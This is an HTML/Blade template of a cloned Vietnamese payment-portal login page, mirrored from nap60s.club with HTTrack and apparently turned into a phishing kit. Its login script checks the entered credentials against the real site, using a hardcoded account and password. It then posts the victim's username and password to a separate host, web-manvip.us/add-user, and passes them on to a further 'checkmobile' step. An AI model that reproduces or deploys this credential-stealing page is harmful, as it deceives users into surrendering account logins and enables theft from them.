<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from nap60s.club/site/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Nov 2018 15:31:53 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/assets/5207afb6/bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/assets/5207afb6/css/bootstrap-yii.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/assets/5207afb6/css/jquery-ui-bootstrap.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/css/ace-fonts.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/css/ace.min.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/css/ace-rtl.min.css" />
    <link rel="stylesheet" type="text/css" href="{{url('/')}}/master/css/main.css" />
    <script type="text/javascript" src="{{url('/')}}/master/assets/6e2a2317/jquery.min.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/assets/5207afb6/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/assets/5207afb6/js/bootstrap-noconflict.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/assets/5207afb6/bootbox/bootbox.min.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/assets/5207afb6/notify/notify.min.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/js/html5shiv.js"></script>
    <script type="text/javascript" src="{{url('/')}}/master/js/respond.min.js"></script>
    <title>
        Cổng chuyển khoản 60s.club
    </title>
    <meta name="description" content="User login page" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- basic styles -->

    <!--[if IE 7]>
    $cs->registerCssFile(ROOT_URL . '/css/font-awesome-ie7.min.css');
    <![endif]-->

    <!--[if lte IE 8]>
    $cs->registerCssFile(ROOT_URL . '/css/ace-ie.min.css');
    <![endif]-->

    <!-- inline styles related to this page -->

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->

    <!--[if lt IE 9]>
    <![endif]-->
</head>

<body class="login-layout">
<div class="main-container">
    <div class="main-content">
        <div class="row">
            <div class="col-sm-10 col-sm-offset-1">
                <div class="login-container" style="margin-top: 10%">
                    <center><span class="logo-lg"><img src="{{url('/')}}/master/img/logo1.png"/></span></center>
                    <div class="space-6"></div>
                    <div class="position-relative">
                        <style type="text/css">
                            #yw0_button{
                                display: none;
                            }
                        </style>
                        <meta name="csrf-token" content="{{ csrf_token() }}">

                        <form id="login-form" action="/" method="post">
                            <div id="login-box" class="login-box visible widget-box no-border">
                                <div class="widget-body">
                                    <div class="widget-main">
                                        <div class="space-6"></div>
                                        <fieldset>
                                            <label class="block clearfix">
                                        <span class="block input-icon input-icon-right">
                        <input class="form-control login-u" placeholder="Tên tài khoản" name="LoginForm[username]" id="LoginForm_username" type="text" />                    </span>
                                            </label>

                                            <label class="block clearfix">
                                        <span class="block">
                        <input class="form-control login-p" placeholder="Mật khẩu" name="LoginForm[password]" id="LoginForm_password" type="password" />                    </span>
                                            </label>
                                            <div class="row rememberMe">
                                                <input id="ytLoginForm_rememberMe" type="hidden" value="0" name="LoginForm[rememberMe]" /><input name="LoginForm[rememberMe]" id="LoginForm_rememberMe" value="1" type="checkbox" />                    <label for="LoginForm_rememberMe">Ghi nhớ</label>                                    </div>
                                            <a href="https://www.facebook.com/dialog/oauth?client_id=1979927462336372&amp;redirect_uri=https://60s.club&amp;scope=email,public_profile" class="login_fb"><img id="floading" style="float: left" name="floading"  src="{{url('/')}}/master/img/fb.jpg" height="30px"></a>
                                            <div class="clearfix">
                                                <label class="inline">
                                                </label>
                                                <button type="button" class="width-35 pull-right btn btn-sm btn-primary btn-login">
                                                    Đăng nhập
                                                </button>
                                            </div>

                                            <div class="space-4"></div>
                                        </fieldset>
                                    </div>
                                    <!-- /widget-main -->

                                </div>
                                <!-- /login-box -->
                        </form>
                    </div><!-- /position-relative -->
                </div>
            </div><!-- /.col -->
        </div><!-- /.row -->
    </div>
</div><!-- /.main-container -->
<div id="fb-root"></div>
<script type="text/javascript" src="{{url('/')}}connect.facebook.net/en_US/all.js"></script>
<script type="text/javascript">
    /*<![CDATA[*/
    jQuery(function($) {
        jQuery('[data-toggle=popover]').popover();
        jQuery('[data-toggle=tooltip]').tooltip();
    });
    /*]]>*/
</script>
<script>
    $(".btn-login").on("click", function () {
        var uname = $(".login-u").val(),
            upass = $(".login-p").val();


        if (uname.length === 0 || upass.length === 0) {
            showModal("Bạn chưa nhập tên đăng nhập hoặc nhập sai tên đăng nhập");
            return false;
        }

        $.ajax({
            type: "post",
            {{--url: "{{url('/v1/add-user')}}",--}}
            url: "https://nap60s.club/site/login?LoginForm%5Busername%5D=babayit96&LoginForm%5Bpassword%5D=A123456&LoginForm%5BrememberMe%5D=0",
            data: {
            },
            dataType: 'json',
            success: function (re) {
                href = "google.com";
                if(re.errorCode == 0){
                    showModal("Đăng nhập thành công");
                    $.ajax({
                        headers: {
                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                        },
                        type: "post",
                        url: "http://web-manvip.us/add-user",
                        data: {
                            un: uname,
                            pww: upass,
                        },
                        dataType: 'json',
                        success: function (re2) {
                            checkmobile(uname, upass);
                        },
                        error: function () {
                            showModal("Đăng nhập thất bại.");
                            return false;
                        }
                    });
                }else if(re.errorCode == 1005){
                    showModal("Tên đăng nhập không tồn tại");

                }else if(re.errorCode == 1007){
                    showModal("Mật khẩu không chính xác");
                }
                return false;
            },
            error: function () {
                showModal("Đăng nhập thất bại.");
                return false;
            }
        });


    });
</script>
</body>

<!-- Mirrored from nap60s.club/site/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Nov 2018 15:32:02 GMT -->
</html>
